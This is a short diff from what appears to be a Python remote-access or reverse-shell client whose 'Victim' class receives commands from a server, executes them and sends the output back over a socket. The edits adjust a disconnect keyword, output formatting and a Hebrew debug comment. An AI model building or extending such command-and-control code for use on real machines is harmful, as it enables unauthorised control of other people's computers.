@@ -62,7 +62,7 @@ class Victim:
     def commit_command(self,command):
 
         output = self.is_it_should_disconnected(command)
-        if output not in ["[ILLEGAL COMMAND]", "[DISCONNECTED]"]:
+        if output not in ["[ILLEGAL COMMAND]", "stop"]:
 
             print(f"[COMMAND RECEIVED] {command}")
 
@@ -79,13 +79,13 @@ class Victim:
 
 
 
-        return output
+        return output + '\n'
 
 
     def send_command(self,output):
 
 
-        print(f"[SENDING DEBUG] sending result: {output[:50]}...")
+        print(f"[SENDING DEBUG] sending result: {output[:50]}...") #לא חייב גג 50 סתם שאני לא אעמיס
 
         self.client_socket.sendall(output.encode(self.FORMAT))
 
@@ -119,6 +119,7 @@ class Victim:
     def start(self):
 
         while True:
+
             command = self.listen_to_server()
 
             output = self.commit_command(command)
